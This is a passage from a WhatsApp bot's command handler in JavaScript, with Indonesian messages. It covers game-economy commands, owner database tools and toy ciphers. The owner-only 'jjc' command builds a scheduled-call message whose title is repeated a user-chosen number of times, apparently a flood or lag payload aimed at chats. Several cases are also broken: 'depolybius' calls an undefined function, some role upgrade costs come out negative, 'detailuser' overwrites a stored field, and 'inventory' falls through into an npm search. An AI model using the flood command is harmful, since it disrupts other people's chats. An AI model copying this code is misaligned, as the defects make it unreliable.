 const netResultMessage = `- Hasil Sebelum Di Kurangin: ${expectedPercentage}%\n- Hasil Sesudah Di Kurangin: ${formattedPercentage}%\n\n- Jadik Hasil Bersih Yang Kamu Dapat: ${formattedPercentage}%`;

 const response = `${goodKeywordsMessage}\n${badKeywordsMessage}\n${netResultMessage}`;

 m.reply(response);
}
 break
case 'sendlinkgc': {
if (!isPrem) return reply(mess.prem)
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628***`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await sky.groupInviteCode(from)
sky.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'listdb': {
 if (!isCreator) return m.reply(mess.owner);

 let PhoneNum = require("awesome-phonenumber");
 let regionNames = new Intl.DisplayNames(["en"], { type: "region" });
 const usersList = Object.keys(db.data.users);
 const totalUsers = usersList.length;
 let arr = [];

 for (let user of usersList) {
 arr.push({
 number: user,
 code: regionNames.of(PhoneNum("+" + user.split("@")[0]).getRegionCode("internasional")),
 });
 }

 let json = {};
 for (let contact of arr) {
 let country = contact.code;
 json[country] = (json[country] || 0) + 1;
 }

 let countryCounts = Object.keys(json).map((country) => ({
 name: country,
 total: json[country],
 }));

 let totalSum = countryCounts.reduce((acc, country) => acc + country.total, 0);
 let totalRegion = [...new Set(arr.map(a => a.code))];
 let hasil = countryCounts.map(({ name, total }) => ({
 name,
 total,
 percentage: ((total / totalSum) * 100).toFixed(2) + '%'
 }));

 let cap = `┌─ _Jumlah Pengguna Database_
│ > 𝘛𝘰𝘵𝘢𝘭 𝘗𝘦𝘯𝘨𝘨𝘶𝘯𝘢 : ${totalUsers}
│ > 𝘛𝘰𝘵𝘢𝘭 𝘙𝘦𝘨𝘪𝘰𝘯 : ${totalRegion.length}
└───────────────

┌─ _Asal Pengguna_
${hasil.sort((b, a) => a.total - b.total).map(a => `│ > 𝘙𝘦𝘨𝘪𝘰𝘯 : ${a.name} > [ ${a.percentage} ]
│ > 𝘛𝘰𝘵𝘢𝘭 : ${a.total} 𝘗𝘦𝘯𝘨𝘨𝘶𝘯𝘢`).join("\n")}
└───────────────`;

 m.reply(`${cap}`);
}
break
case 'deleteuser': {
if (!isCreator) return m.reply(mess.owner)
 const userNumber = parseInt(args[0]);

 if (isNaN(userNumber) || userNumber <= 0) {
 m.reply('Tentukan nomor pengguna yang valid untuk dihapus.');
 return;
 }

 const usersList = Object.keys(db.data.users);
 const totalUsers = usersList.length;

 if (userNumber > totalUsers) {
 m.reply('Nomor pengguna tidak valid. Cek kembali daftar pengguna.');
 return;
 }

 const userToDelete = usersList[userNumber - 1];
 delete db.data.users[userToDelete];

 m.reply(`Pengguna @${userToDelete} telah dihapus.`);
}
 break
case 'resetdb': {
if (!isCreator) return m.reply(mess.owner)
 db.data.users = {}; // Menghapus seluruh data pengguna
 m.reply('Database pengguna berhasil di-reset. Seluruh pengguna telah dihapus.');
}
 break
case 'detailuser': {
 if (!isCreator) return m.reply(mess.owner);
 
 const userNumber = parseInt(args[0]);

 if (isNaN(userNumber) || userNumber <= 0) {
 m.reply('Tentukan nomor pengguna yang valid untuk ditampilkan detailnya.');
 return;
 }

 const usersList = Object.keys(db.data.users);
 const totalUsers = usersList.length;

 if (userNumber > totalUsers) {
 m.reply('Nomor pengguna tidak valid. Cek kembali daftar pengguna.');
 return;
 }

 const userId = usersList[userNumber - 1];
 const userDetail = db.data.users[userId];
 const currentDate = new Date().toLocaleString(); // Mengambil waktu hari ini

 userDetail.premium = currentDate; // Mengganti nilai premium dengan waktu hari ini

 // Ambil nama pengguna dari nomor
 const userName = userDetail.name || (await sky.getName(userId)); // Jika tidak ada nama di database, ambil dari nomor

 const detailText = `Detail Pengguna @${userId}:\n` +
 `Nama: ${userName || 'Nama tidak tersedia'}\n` + // Menampilkan nama pengguna
 `AFK Time: ${userDetail.afkTime || 'Tidak ada'}\n` +
 `AFK Reason: ${userDetail.afkReason || 'Tidak ada'}\n` +
 `Limit: ${userDetail.limit || 'Tidak ada'}\n` +
 `Balance: ${userDetail.balance || 'Tidak ada'}\n` +
 `Waktu Hari Ini: ${userDetail.premium}`;

 m.reply(detailText);
}
break;

case 'mining': {
 const user = db.data.users[m.sender];

 if (typeof user === 'undefined') throw 'Pengguna tidak ada dalam database';

 if (user.lastMining && Date.now() - user.lastMining < 3600000) {
 const remainingTime = Math.ceil((3600000 - (Date.now() - user.lastMining)) / 60000);
 m.reply(`Anda baru saja melakukan mining. Silakan tunggu ${remainingTime} menit untuk mining kembali.`);
 } else {
 const minedGold = Math.floor(Math.random() * 10) + 1;
 const minedSilver = Math.floor(Math.random() * 10) + 1;
 const minedEmerald = Math.floor(Math.random() * 10) + 1;
 const minedPotion = Math.floor(Math.random() * 10) + 1;

 user.gold += minedGold;
 user.silver += minedSilver;
 user.emerald += minedEmerald;
 user.potion += minedPotion;
 user.lastMining = Date.now();

 m.reply(`Anda berhasil melakukan mining!\n\nHasil:\nGold: ${minedGold} 💰\nSilver: ${minedSilver} 💰\nEmerald: ${minedEmerald} 💎\nPotion: ${minedPotion} 🧪`);
 }
}
 break
case 'shop': {
 const args = m.text.trim().split(' ');
 const action = args[1]?.toLowerCase();

 const getRandomPrice = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);

 const itemPrices = {
 gold: { buy: getRandomPrice(5000, 10000), sell: getRandomPrice(2000, 4000) },
 silver: { buy: getRandomPrice(5000, 10000), sell: getRandomPrice(2000, 4000) },
 emerald: { buy: getRandomPrice(5000, 10000), sell: getRandomPrice(2000, 4000) },
 potion: { buy: getRandomPrice(5000, 10000), sell: getRandomPrice(2000, 4000) },
 };

 const user = db.data.users[m.sender];

 if (action === 'buy') {
 const itemName = args[2]?.toLowerCase();
 const quantity = parseInt(args[3]);

 if (!itemName || isNaN(quantity) || quantity <= 0) {
 m.reply('Format penggunaan: shop buy <nama_item> <jumlah>');
 return;
 }

 const totalCost = itemPrices[itemName]?.buy * quantity;

 if (!totalCost || user.balance < totalCost) {
 m.reply('Maaf, saldo Anda tidak mencukupi untuk pembelian ini.');
 return;
 }

 user[itemName] += quantity;
 user.balance -= totalCost;

 m.reply(`Anda berhasil membeli ${quantity} ${itemName}(s) seharga Rp.${totalCost}.`);
 } else if (action === 'sell') {
 const itemName = args[2]?.toLowerCase();
 const quantity = parseInt(args[3]);

 if (!itemName || isNaN(quantity) || quantity <= 0) {
 m.reply('Format penggunaan: shop sell <nama_item> <jumlah>');
 return;
 }

 const totalEarned = itemPrices[itemName]?.sell * quantity;

 if (!totalEarned || user[itemName] < quantity) {
 m.reply('Maaf, Anda tidak memiliki cukup barang untuk dijual.');
 return;
 }

 user[itemName] -= quantity;
 user.balance += totalEarned;

 m.reply(`Anda berhasil menjual ${quantity} ${itemName}(s) dan mendapatkan Rp.${totalEarned}.`);
 } else if (action === 'list') {
 const priceList = Object.entries(itemPrices).map(([item, prices]) => {
 return `${item} - Beli: Rp.${prices.buy} - Jual: Rp.${prices.sell}`;
 }).join('\n');

 m.reply(`Daftar Harga:\n${priceList}`);
 } else {
 m.reply('Aksi tidak valid. Gunakan "buy", "sell", atau "list".');
 }
}
 break
case 'price': {
 const args = m.text.trim().split(' ');
 const action = args[1]?.toLowerCase();
 const itemName = args[2]?.toLowerCase();
 const total = parseInt(args[3]);

 if (!action || !itemName || isNaN(total) || total <= 0) {
 m.reply('Format penggunaan: price sell/buy <nama_item> <total>');
 return;
 }

 const getRandomPrice = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);

 const itemPrices = {
 gold: { buy: getRandomPrice(5000, 10000), sell: getRandomPrice(2000, 4000) },
 silver: { buy: getRandomPrice(5000, 10000), sell: getRandomPrice(2000, 4000) },
 emerald: { buy: getRandomPrice(5000, 10000), sell: getRandomPrice(2000, 4000) },
 potion: { buy: getRandomPrice(5000, 10000), sell: getRandomPrice(2000, 4000) },
 };

 if (action === 'buy') {
 const buyPrice = itemPrices[itemName]?.buy;
 const totalCost = buyPrice * total;
 const balanceNeeded = totalCost - db.data.users[m.sender].balance;

 if (balanceNeeded > 0) {
 m.reply(`Harga beli ${total} ${itemName}(s) adalah Rp.${totalCost}.\n\nDuit Anda Rp.${db.data.users[m.sender].balance}, Anda membutuhkan Rp.${balanceNeeded} balance untuk membeli ${total} ${itemName}(s).`);
 } else {
 m.reply(`Harga beli ${total} ${itemName}(s) adalah Rp.${totalCost}.\n\nDuit Anda Rp.${db.data.users[m.sender].balance}, Anda memiliki saldo cukup.`);
 }
 } else if (action === 'sell') {
 const sellPrice = itemPrices[itemName]?.sell;
 const totalEarned = sellPrice * total;
 
 m.reply(`Harga jual ${total} ${itemName}(s) adalah Rp.${totalEarned}.\n\nDuit Anda Rp.${db.data.users[m.sender].balance}, jika Anda menjual ${total} ${itemName}(s) maka saldo Anda akan bertambah sebanyak Rp.${totalEarned}.`);
 } else {
 m.reply('Aksi tidak valid. Gunakan "buy" atau "sell".');
 }
}
 break
 
case 'ngutang': {
 const args = m.text.trim().split(' ');
 const amountToBorrow = parseInt(args[1]);
 const paymentDeadline = args.slice(2).join(' '); // Menggabungkan bagian tempo_pembayaran yang mungkin memiliki spasi

 function calculateMillisecondsUntilDeadline(deadline) {
 const [amount, unit] = deadline.split(' ');

 if (!unit) {
 m.reply('Format tempo pembayaran tidak valid.');
 return;
 }

 const timeUnits = {
 detik: 1000,
 menit: 60 * 1000,
 jam: 60 * 60 * 1000,
 hari: 24 * 60 * 60 * 1000,
 minggu: 7 * 24 * 60 * 60 * 1000,
 };

 return parseInt(amount) * (timeUnits[unit.toLowerCase()] || 0);
 }

 if (isNaN(amountToBorrow) || amountToBorrow <= 0 || !paymentDeadline) {
 m.reply('Format penggunaan: ngutang <jumlah_balance> <tempo_pembayaran>');
 return;
 }

 if (amountToBorrow > 1000000) {
 m.reply('Maaf, total hutang tidak boleh lebih dari 1 juta.');
 return;
 }

 db.data.users[m.sender].balance += amountToBorrow;
 
 db.data.users[m.sender].debt = {
 amount: amountToBorrow,
 deadline: paymentDeadline,
 };

 m.reply(`Anda berhasil mengajukan utang sebesar Rp.${amountToBorrow} dengan tempo pembayaran ${paymentDeadline}.`);

 setTimeout(() => {
 const userDebt = db.data.users[m.sender].debt;
 if (userDebt && userDebt.amount > 0) {
 db.data.users[m.sender].balance = -1000000;
 m.reply(`Anda telat membayar utang. Saldo Anda menjadi Rp.-1.000.000.`);
 }
 }, calculateMillisecondsUntilDeadline(paymentDeadline));
}
break
case 'cektagihan': {
 const debtAmount = db.data.users[m.sender]?.debt?.amount || 0;

 if (debtAmount > 0) {
 const debtDeadline = db.data.users[m.sender].debt.deadline;
 m.reply(`Anda memiliki hutang sebesar Rp.${debtAmount} dengan tempo pembayaran ${debtDeadline}.`);
 } else {
 m.reply('Anda tidak memiliki hutang yang harus dibayar.');
 }
 break;
}
case 'bayarhutang': {
 const userDebt = db.data.users[m.sender]?.debt;
 const userBalance = db.data.users[m.sender]?.balance || 0;
 const paymentAmount = parseInt(args[0]);

 if (!userDebt || userDebt.amount <= 0) {
 m.reply('Anda tidak memiliki hutang yang harus dibayar.');
 return;
 }

 if (isNaN(paymentAmount) || paymentAmount <= 0 || paymentAmount > userBalance) {
 m.reply('Masukkan jumlah pembayaran yang valid dan sesuai dengan saldo Anda.');
 return;
 }

 const remainingDebt = userDebt.amount - paymentAmount;

 if (paymentAmount >= userDebt.amount) {
 // Bayar hutang secara penuh dan reset informasi utang
 db.data.users[m.sender].balance -= userDebt.amount;
 db.data.users[m.sender].debt = {
 amount: 0,
 deadline: '',
 };

 m.reply(`Sukses membayar total hutang sebesar Rp.${userDebt.amount}. Sisa saldo Anda: Rp.${db.data.users[m.sender].balance}.`);
 } else {
 // Nyicil pembayaran dan update sisa hutang
 db.data.users[m.sender].debt.amount -= paymentAmount;
 db.data.users[m.sender].balance -= paymentAmount;

 m.reply(`Sukses membayar Rp.${paymentAmount}. Sisa hutang sebesar Rp.${remainingDebt}. jangan Lupa Membayar Sisa Hutang ><`);
 }
}
 break
// Case inventory
case 'inventory':
case 'npms': {
	if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break
case 'menuabersamamu': {
m.reply('ya ya boleh saja')
}
break
case 'jjc': {
 if (!isCreator) throw mess.owner;
 const args = q.split(' | ');

 if (args.length === 2) {
 const titleText = args[0];
 const totalTitles = parseInt(args[1]);

 if (!isNaN(totalTitles) && totalTitles > 0) {
 let title = `${titleText}\n`.repeat(totalTitles);
 const inviteCode = 'http://wa.me/6283870640443';
 const timerDuration = 2 * 60 * 60 * 1000; // 2 jam dalam milidetik
 const scheduledTimestampMs = Date.now();

 sky.relayMessage(m.chat, {
 scheduledCallCreationMessage: {
 callType: "VOICE",
 scheduledTimestampMs: scheduledTimestampMs,
 title: title,
 inviteCode: inviteCode,
 expireTimestampMs: scheduledTimestampMs + timerDuration,
 }
 }, {});
 } else {
 m.reply('Tentukan jumlah total yang valid (angka positif).');
 }
 } else {
 m.reply('Format yang benar: jc [judul] | [jumlah_total]');
 }
}
 break
case 'binary': {
 const textToBinary = (text) => {
 return text.split('').map(char => {
 const binaryValue = char.charCodeAt(0).toString(2); // Konversi ke biner
 return '0'.repeat(8 - binaryValue.length) + binaryValue; // Padding menjadi 8-bit
 }).join(' ');
 };

 const inputText = args.join(' '); // Menggabungkan argumen menjadi satu teks
 const binaryRepresentation = textToBinary(inputText);

 m.reply(`${binaryRepresentation}`);
}
 break
case 'debinary': {
 const binaryToText = (binaryString) => {
 const binaryArray = binaryString.split(' ');
 const text = binaryArray.map(binary => String.fromCharCode(parseInt(binary, 2))).join('');
 return text;
 };

 const binaryInput = args.join(' '); // Menggabungkan argumen menjadi satu teks biner
 const textResult = binaryToText(binaryInput);

 m.reply(`${textResult}`);
}
 break
case 'rot13': {
 const textToRot13 = (text) => {
 return text.replace(/[a-zA-Z]/g, (char) => {
 const isUpperCase = char === char.toUpperCase();
 const startCode = isUpperCase ? 65 : 97;
 const offset = 13;
 const rotatedCharCode = (char.charCodeAt(0) - startCode + offset) % 26 + startCode;
 return String.fromCharCode(rotatedCharCode);
 });
 };

 const inputText = args.join(' '); // Menggabungkan argumen menjadi satu teks
 const rot13Result = textToRot13(inputText);

 m.reply(`${rot13Result}`);
}
 break
case 'derot13': {
 const rot13ToText = (rot13String) => {
 return rot13String.replace(/[a-zA-Z]/g, (char) => {
 const isUpperCase = char === char.toUpperCase();
 const startCode = isUpperCase ? 65 : 97;
 const offset = 13;
 const originalCharCode = (char.charCodeAt(0) - startCode - offset + 26) % 26 + startCode;
 return String.fromCharCode(originalCharCode);
 });
 };

 const rot13Input = args.join(' '); // Menggabungkan argumen menjadi satu teks ROT13
 const textResult = rot13ToText(rot13Input);

 m.reply(`Konversi dari ROT13 ke teks:\n${rot13Input} menjadi "${textResult}"`);
}
 break
case 'encryptaes': {
 const encryptAES = (plainText, secretKey) => {
 try {
 const cipher = crypto.createCipher('aes-256-cbc', secretKey);
 let encryptedText = cipher.update(plainText, 'utf-8', 'hex');
 encryptedText += cipher.final('hex');
 return encryptedText;
 } catch (error) {
 return 'Gagal mengenkripsi dengan AES.';
 }
 };

 const plainTextInput = args.slice(1).join(' '); // Menggabungkan argumen setelah "encryptAES" menjadi satu teks
 const secretKeyInput = args[0]; // Kunci rahasia yang digunakan

 const encryptedResult = encryptAES(plainTextInput, secretKeyInput);

 m.reply(`Enkripsi AES:\nTeks: "${plainTextInput}"\nKunci: "${secretKeyInput}"\nHasil Enkripsi: "${encryptedResult}"`);
}
 break
case 'decryptaes': {
 const decryptAES = (encryptedText, secretKey) => {
 try {
 const decipher = crypto.createDecipher('aes-256-cbc', secretKey);
 let decryptedText = decipher.update(encryptedText, 'hex', 'utf-8');
 decryptedText += decipher.final('utf-8');
 return decryptedText;
 } catch (error) {
 return 'Gagal mendekripsi dengan AES.';
 }
 };

 const encryptedInput = args.slice(1).join(' '); // Menggabungkan argumen setelah "decryptAES" menjadi satu teks terenkripsi
 const secretKeyInput = args[0]; // Kunci rahasia yang digunakan

 const decryptedResult = decryptAES(encryptedInput, secretKeyInput);

 m.reply(`Dekripsi AES:\nTeks Terenkripsi: "${encryptedInput}"\nKunci: "${secretKeyInput}"\nHasil Dekripsi: "${decryptedResult}"`);
}
 break
case 'polybius': {
 // Fungsi untuk membuat tabel Polybius Square
 const createPolybiusSquare = () => {
 const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
 const square = [];
 let index = 0;

 for (let i = 0; i < 5; i++) {
 const row = [];
 for (let j = 0; j < 5; j++) {
 if (index < alphabet.length) {
 row.push(alphabet[index]);
 index++;
 }
 }
 square.push(row);
 }

 return square;
 };

 // Fungsi untuk mengenkripsi teks menggunakan Polybius Square
 const polybiusEncrypt = (text) => {
 const square = createPolybiusSquare();
 const encryptedText = text.toUpperCase().replace(/J/g, 'I'); // Mengganti J dengan I

 let result = '';
 for (const char of encryptedText) {
 if (char === ' ') {
 result += ' ';
 } else {
 for (let i = 0; i < square.length; i++) {
 for (let j = 0; j < square[i].length; j++) {
 if (square[i][j] === char) {
 result += `${i + 1}${j + 1} `;
 }
 }
 }
 }
 }

 return result.trim();
 };

 // Fungsi untuk mendekripsi teks menggunakan Polybius Square
 const polybiusDecrypt = (cipher) => {
 const square = createPolybiusSquare();
 const pairs = cipher.split(' ');

 let result = '';
 for (const pair of pairs) {
 if (pair === '') {
 result += ' ';
 } else {
 const row = parseInt(pair[0]) - 1;
 const col = parseInt(pair[1]) - 1;
 result += square[row][col];
 }
 }

 return result;
 };

 const plaintext = args.join(' '); // Menggabungkan argumen setelah "polybiusExample" menjadi satu teks
 const encryptedText = polybiusEncrypt(plaintext);
 const decryptedText = polybiusDecrypt(encryptedText);

 m.reply(`Plaintext: ${plaintext}\nEncrypted Text: ${encryptedText}\nDecrypted Text: ${decryptedText}`);
}
 break
case 'depolybius': {
 // Fungsi untuk mendekripsi teks menggunakan Polybius Square
 const polybiusToText = (cipher) => {
 const square = createPolybiusSquare(); // Gunakan fungsi yang sudah didefinisikan sebelumnya
 const pairs = cipher.split(' ');

 let result = '';
 for (const pair of pairs) {
 if (pair === '') {
 result += ' ';
 } else {
 const row = parseInt(pair[0]) - 1;
 const col = parseInt(pair[1]) - 1;
 result += square[row][col];
 }
 }

 return result;
 };

 const cipherText = args.join(' '); // Menggabungkan argumen setelah "polybiusToTextExample" menjadi satu teks
 const decryptedText = polybiusToText(cipherText);

 m.reply(`Cipher Text: ${cipherText}\nDecrypted Text: ${decryptedText}`);
}
 break
case 'elgamal': {
 // Fungsi untuk menghasilkan kunci ElGamal
 const generateElGamalKeys = () => {
 const prime = 23; // Pilih bilangan prima yang cukup besar
 const primitiveRoot = 5; // Pilih akar primitif modulo prime

 const privateKey = Math.floor(Math.random() * (prime - 2) + 1); // Pilih private key secara acak
 const publicKey = Math.pow(primitiveRoot, privateKey) % prime; // Hitung public key

 return { prime, primitiveRoot, privateKey, publicKey };
 };

 // Fungsi untuk melakukan enkripsi pesan
 const elGamalEncrypt = (message, publicKey, prime, primitiveRoot) => {
 const k = Math.floor(Math.random() * (prime - 2) + 1); // Pilih k secara acak
 const part1 = Math.pow(primitiveRoot, k) % prime;
 const part2 = (message * Math.pow(publicKey, k)) % prime;

 return { part1, part2 };
 };

 // Fungsi untuk melakukan dekripsi pesan
 const elGamalDecrypt = (ciphertext, privateKey, prime) => {
 const s = Math.pow(ciphertext.part1, privateKey) % prime;
 const sInverse = modInverse(s, prime);
 const decryptedMessage = (ciphertext.part2 * sInverse) % prime;

 return decryptedMessage;
 };

 // Fungsi untuk mencari invers modulo
 const modInverse = (a, m) => {
 for (let i = 1; i < m; i++) {
 if ((a * i) % m === 1) {
 return i;
 }
 }
 return -1;
 };

 // Contoh penggunaan ElGamal Encryption
 const { prime, primitiveRoot, privateKey, publicKey } = generateElGamalKeys();
 const plaintext = Math.floor(Math.random() * (prime - 2) + 1); // Pilih pesan secara acak
 const ciphertext = elGamalEncrypt(plaintext, publicKey, prime, primitiveRoot);
 const decryptedMessage = elGamalDecrypt(ciphertext, privateKey, prime);

 m.reply(`Prime: ${prime}\nPrimitive Root: ${primitiveRoot}\nPrivate Key: ${privateKey}\nPublic Key: ${publicKey}\nPlaintext: ${plaintext}\nCiphertext: ${JSON.stringify(ciphertext)}\nDecrypted Message: ${decryptedMessage}`);
}
 break
case 'deelgamal': {
 // Fungsi untuk menghasilkan kunci ElGamal
 const generateElGamalKeys = () => {
 const prime = 23; // Pilih bilangan prima yang cukup besar
 const primitiveRoot = 5; // Pilih akar primitif modulo prime

 const privateKey = Math.floor(Math.random() * (prime - 2) + 1); // Pilih private key secara acak
 const publicKey = Math.pow(primitiveRoot, privateKey) % prime; // Hitung public key

 return { prime, primitiveRoot, privateKey, publicKey };
 };

 // Fungsi untuk melakukan enkripsi pesan
 const elGamalEncrypt = (message, publicKey, prime, primitiveRoot) => {
 const k = Math.floor(Math.random() * (prime - 2) + 1); // Pilih k secara acak
 const part1 = Math.pow(primitiveRoot, k) % prime;
 const part2 = (message * Math.pow(publicKey, k)) % prime;

 return { part1, part2 };
 };

 // Fungsi untuk melakukan dekripsi pesan
 const elGamalDecrypt = (ciphertext, privateKey, prime) => {
 const s = Math.pow(ciphertext.part1, privateKey) % prime;
 const sInverse = modInverse(s, prime);
 const decryptedMessage = (ciphertext.part2 * sInverse) % prime;

 return decryptedMessage;
 };

 // Fungsi untuk mencari invers modulo
 const modInverse = (a, m) => {
 for (let i = 1; i < m; i++) {
 if ((a * i) % m === 1) {
 return i;
 }
 }
 return -1;
 };

 // Contoh penggunaan ElGamal Encryption
 const { prime, primitiveRoot, privateKey, publicKey } = generateElGamalKeys();
 const plaintext = Math.floor(Math.random() * (prime - 2) + 1); // Pilih pesan secara acak
 const ciphertext = elGamalEncrypt(plaintext, publicKey, prime, primitiveRoot);
 const decryptedMessage = elGamalDecrypt(ciphertext, privateKey, prime);

 m.reply(`Prime: ${prime}\nPrimitive Root: ${primitiveRoot}\nPrivate Key: ${privateKey}\nPublic Key: ${publicKey}\nPlaintext: ${plaintext}\nCiphertext: ${JSON.stringify(ciphertext)}\nDecrypted Message: ${decryptedMessage}`);
}
 break
case 'secretcode': {
m.reply(`
> binary
> debinary

> rot13
> derot13

> caesarcipher
> decaesarcipher

> caesardynamic
> decaesardynamic

> encryptaes
> decryptaes

> polybius
> depolybius

> elgamal
> deelgamal
`)
}
break
case 'add+': {
 if (!isCreator) return m.reply(mess.owner);

 const amount = parseInt(args[0]);
 const targetType = args[1]; // 'balance' atau 'limit'

 if (isNaN(amount) || amount <= 0 || !['balance', 'limit'].includes(targetType)) {
 m.reply('Format perintah tidak valid. Contoh: add+ 2000 balance');
 return;
 }

 const usersList = Object.keys(db.data.users);
 const totalUsers = usersList.length;

 if (totalUsers === 0) {
 m.reply('Belum ada user di database.');
 return;
 }

 // Tambahkan saldo atau batas untuk setiap user
 usersList.forEach(user => {
 const userDetail = db.data.users[user];
 userDetail[targetType] += amount;
 });

 // Pemberitahuan berhasil
 m.reply(`Berhasil menambah ${amount} ${targetType} untuk semua user.`);

 // Tambahkan log jika diperlukan
 const logText = `Add+ - Menambah ${amount} ${targetType} untuk semua user.`;
 console.log(logText);
}
break
case 'take': {
 if (!isCreator) return m.reply(mess.owner);

 const amount = parseInt(args[0]);
 const targetType = args[1]; // 'balance' atau 'limit'

 if (isNaN(amount) || amount <= 0 || !['balance', 'limit'].includes(targetType)) {
 m.reply('Format perintah tidak valid. Contoh: take 5000 balance');
 return;
 }

 const usersList = Object.keys(db.data.users);
 const totalUsers = usersList.length;

 if (totalUsers === 0) {
 m.reply('Belum ada user di database.');
 return;
 }

 // Pastikan total jumlah yang diambil tidak melebihi saldo atau batas setiap user
 const insufficientFunds = usersList.some(user => {
 const userDetail = db.data.users[user];
 return userDetail[targetType] < amount;
 });

 if (insufficientFunds) {
 m.reply(`Ada user yang tidak memiliki saldo atau batas cukup untuk diambil sejumlah ${amount} ${targetType}.`);
 return;
 }

 // Ambil saldo atau batas dari setiap user
 let totalAmount = 0;
 usersList.forEach(user => {
 const userDetail = db.data.users[user];
 userDetail[targetType] -= amount;
 totalAmount += amount;
 });

 // Kirim saldo atau batas kepada peminta
 const peminta = sender;
 db.data.users[peminta][targetType] += totalAmount;

 // Pemberitahuan berhasil
 m.reply(`Berhasil mengambil ${amount} ${targetType} dari setiap user dan mentransfer kepada @${peminta}.`);

 // Tambahkan log jika diperlukan
 const logText = `Take - Mengambil ${amount} ${targetType} dari setiap user dan mentransfer kepada @${peminta}.`;
 console.log(logText);
}
break
case 'cekrole': {
 const userBalance = db.data.users[sender].balance;

 let userRole = 'Unknown';
 let upgradeCost = 0;
 let nextRole = '';

 if (userBalance < 12900) {
 userRole = 'Poor';
 upgradeCost = 14200 - userBalance;
 nextRole = 'Struggling';
 } else if (userBalance < 55000) {
 userRole = 'Struggling';
 upgradeCost = 58800 - userBalance;
 nextRole = 'Average';
 } else if (userBalance < 199000) {
 userRole = 'Average';
 upgradeCost = 32000 - userBalance;
 nextRole = 'Saver';
 } else if (userBalance < 1400000) {
 userRole = 'Saver';
 upgradeCost = 150400 - userBalance;
 nextRole = 'Investor';
 } else if (userBalance < 2500000) {
 userRole = 'Investor';
 upgradeCost = 2500000 - userBalance;
 nextRole = 'Wealth Builder';
 } else if (userBalance < 5000000) {
 userRole = 'Wealth Builder';
 upgradeCost = 5000000 - userBalance;
 nextRole = 'Financial Steward';
 } else if (userBalance < 10000000) {
 userRole = 'Financial Steward';
 upgradeCost = 10000000 - userBalance;
 nextRole = 'Money Manager';
 } else if (userBalance < 15000000) {
 userRole = 'Money Manager';
 upgradeCost = 15000000 - userBalance;
 nextRole = 'Prosperous';
 } else if (userBalance < 20000000) {
 userRole = 'Prosperous';
 upgradeCost = 20000000 - userBalance;
 nextRole = 'Affluent';
 } else if (userBalance < 25000000) {
 userRole = 'Affluent';
 upgradeCost = 25000000 - userBalance;
 nextRole = 'Wealth Elite';
 } else if (userBalance < 30000000) {
 userRole = 'Wealth Elite';
 upgradeCost = 30000000 - userBalance;
 nextRole = 'High Roller';
 } else if (userBalance < 40000000) {
 userRole = 'High Roller';
 upgradeCost = 40000000 - userBalance;
 nextRole = 'Financial Powerhouse';
 } else if (userBalance < 50000000) {
 userRole = 'Financial Powerhouse';
 upgradeCost = 50000000 - userBalance;
 nextRole = 'Mega Rich';
 } else if (userBalance < 60000000) {
 userRole = 'Mega Rich';
 upgradeCost = 60000000 - userBalance;
 nextRole = 'Ultra Rich';
 } else if (userBalance < 75000000) {
 userRole = 'Ultra Rich';
 upgradeCost = 75000000 - userBalance;
 nextRole = 'Super Rich';
 } else if (userBalance < 100000000) {
 userRole = 'Super Rich';
 upgradeCost = 100000000 - userBalance;
 nextRole = 'Wealth Titan';
 } else if (userBalance < 125000000) {
 userRole = 'Wealth Titan';
 upgradeCost = 125000000 - userBalance;
 nextRole = 'Fortune Baron';
 } else if (userBalance < 150000000) {
 userRole = 'Fortune Baron';
 upgradeCost = 150000000 - userBalance;
 nextRole = 'Tycoon';
 } else if (userBalance < 200000000) {
 userRole = 'Tycoon';
 upgradeCost = 200000000 - userBalance;
 nextRole = 'Capital Magnate';
 } else if (userBalance < 250000000) {
 userRole = 'Capital Magnate';
 upgradeCost = 250000000 - userBalance;
 nextRole = 'Money Monarch';
 } else if (userBalance < 300000000) {
 userRole = 'Money Monarch';
 upgradeCost = 300000000 - userBalance;
 nextRole = 'Billionaire';
 } else if (userBalance < 350000000) {
 userRole = 'Billionaire';
 upgradeCost = 350000000 - userBalance;
 nextRole = 'Economic Overlord';
 } else if (userBalance < 400000000) {
 userRole = 'Economic Overlord';
 upgradeCost = 400000000 - userBalance;
 nextRole = 'Financial Emperor';
 } else if (userBalance < 450000000) {
 userRole = 'Financial Emperor';
 upgradeCost = 450000000 - userBalance;
 nextRole = 'Wealth Sovereign';
 } else if (userBalance < 500000000) {
 userRole = 'Wealth Sovereign';
 upgradeCost = 500000000 - userBalance;
 nextRole = 'Rich Deity';
 } else if (userBalance < 750000000) {
 userRole = 'Rich Deity';
 upgradeCost = 750000000 - userBalance;
 nextRole = 'Money Almighty';
 } else if (userBalance < 1000000000) {
 userRole = 'Money Almighty';
 upgradeCost = 1000000000 - userBalance;
 nextRole = 'Financial Divinity';
 } else if (userBalance < 1500000000) {
 userRole = 'Financial Divinity';
 upgradeCost = 1500000000 - userBalance;
 nextRole = 'Wealth Deity';
 } else {
 userRole = 'Wealth Deity';
 upgradeCost = 0;
 nextRole = 'Role Tertinggi';
 }

 m.reply(`ɴᴀᴍᴀ: ${pushname}\nʀᴏʟᴇ: ${userRole}\nsᴀʟᴅᴏ: ${userBalance}\nɪɴғᴏ: ᴜɴᴛᴜᴋ ᴜᴘ ᴋᴇ ${nextRole}, ᴀɴᴅᴀ ᴍᴇᴍᴇʀʟᴜᴋᴀɴ ${upgradeCost}.ʙᴀʟᴀɴᴄᴇ.`);
}
break

case 'ocr': {
 const uploadImage = require('./lib/uploadImage'); // Pastikan path sesuai dengan file di sistemmu

 // Mengambil media yang dikutip atau dikirim
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';

 // Mengecek apakah ada media yang ditemukan
 if (!mime) {
